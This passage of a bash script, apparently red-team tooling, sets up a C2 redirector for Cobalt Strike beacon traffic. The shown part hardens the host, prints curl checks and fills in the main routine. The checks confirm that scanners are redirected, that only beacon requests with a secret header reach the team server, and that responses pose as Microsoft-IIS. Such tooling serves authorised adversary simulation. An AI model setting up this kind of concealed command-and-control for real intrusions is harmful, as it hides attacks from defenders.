    echo "    curl -sk https://${TEAMSERVER_IP}:${TEAMSERVER_PORT}   # from this host"
}

# =============================================================================
# HOST HARDENING
# SSH key-only auth + minimal firewall — same pattern as ARTOC server-setup.sh
# =============================================================================
harden() {
    section "Host Hardening"

    # Disable SSH password authentication (key-only)
    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
    systemctl reload sshd
    info "SSH password auth disabled."

    # ufw firewall
    if command -v ufw &>/dev/null; then
        ufw --force reset
        ufw default deny incoming
        ufw default allow outgoing
        ufw allow 22/tcp    # SSH management
        ufw allow 80/tcp    # HTTP (HTTPS redirect / Let's Encrypt challenges)
        ufw allow 443/tcp   # HTTPS C2 traffic
        ufw --force enable
        info "ufw firewall configured (22, 80, 443 inbound)."
    else
        warn "ufw not found. Install it: apt install ufw"
    fi
}

# =============================================================================
# POST-SETUP VERIFICATION HINTS
# =============================================================================
print_verify() {
    section "Verification"
    echo "Run these to confirm the redirector is working:"
    echo ""
    echo "  # Show exactly what Apache is serving and from which config file"
    echo "  apache2ctl -S"
    echo ""
    echo "  # List active sites/modules/confs (symlinks = active, files only = dormant)"
    echo "  ls -la /etc/apache2/sites-enabled/"
    echo "  ls -la /etc/apache2/mods-enabled/ | grep -E 'deflate|ssl|proxy|rewrite|security'"
    echo "  ls -la /etc/apache2/conf-enabled/"
    echo ""
    echo "  # Confirm deflate is NOT loaded (would break CS beacon responses)"
    echo "  apache2ctl -M | grep deflate   # should return nothing"
    echo ""
    echo "  # Live-tail the access log while testing"
    echo "  sudo tail -f /var/log/apache2/${DOMAIN:-REDIRECTOR_DOMAIN}-access.log"
    echo ""
    echo "  # Layer 1: scanner UA should get redirected (302)"
    echo "  curl -A 'curl/7.88' -sk https://${DOMAIN:-REDIRECTOR_IP}/ -o /dev/null -w '%{http_code}'"
    echo ""
    echo "  # Layer 2: missing secret header should get redirected (302)"
    echo "  curl -A 'Mozilla/5.0' -sk https://${DOMAIN:-REDIRECTOR_IP}${C2_URI_GET} -o /dev/null -w '%{http_code}'"
    echo ""
    echo "  # Layer 3: all conditions met — should reach team server (200)"
    echo "  curl -A '${BEACON_UA}' -H '${SECRET_HEADER_NAME}: ${SECRET_HEADER_VAL}' \\"
    echo "       -sk https://${DOMAIN:-REDIRECTOR_IP}${C2_URI_GET} -o /dev/null -w '%{http_code}'"
    echo ""
    echo "  # Server header should read Microsoft-IIS/10.0"
    echo "  curl -sI https://${DOMAIN:-REDIRECTOR_IP} | grep -i server"
    echo ""
    echo "  # Check team server is reachable from this redirector"
    echo "  curl -sk https://${TEAMSERVER_IP}:${TEAMSERVER_PORT}"
    echo ""
}

# =============================================================================
# MAIN
# =============================================================================
main() {
    echo ""
    echo "============================================================"
    echo "   Universal C2 Redirector Setup"
    echo "   ARTOC // Derived from White Knight Labs infrastructure"
    echo "============================================================"
    echo ""

    # Resolve profile URIs before pre-flight so they print in summary
    resolve_profile
    preflight

    case "$SERVER_TYPE" in
        apache)
            setup_apache
            harden
            ;;
        nginx)
            setup_nginx
            harden
            ;;
        caddy)
            setup_caddy
            harden
            ;;
        dumbpipe-iptables)
            setup_dumbpipe_iptables
            harden
            ;;
        dumbpipe-socat)
            setup_dumbpipe_socat
            harden
            ;;
    esac

    echo ""
    echo "============================================================"
    info "Setup complete."
    echo "============================================================"
    echo ""
    echo "  Type:          ${SERVER_TYPE}"
    echo "  Profile:       ${PROFILE}"
    echo "  Team server:   ${TEAMSERVER_IP}:${TEAMSERVER_PORT}"
    [[ -n "$DOMAIN" ]] && echo "  Domain:        https://${DOMAIN}"
    echo "  GET URI:       ${C2_URI_GET}"
    echo "  POST URI:      ${C2_URI_POST}"
    echo "  Secret header: ${SECRET_HEADER_NAME}: ${SECRET_HEADER_VAL}"
    echo "  Decoy:         ${DECOY_URL}"
    echo ""

    print_verify
}

main "$@"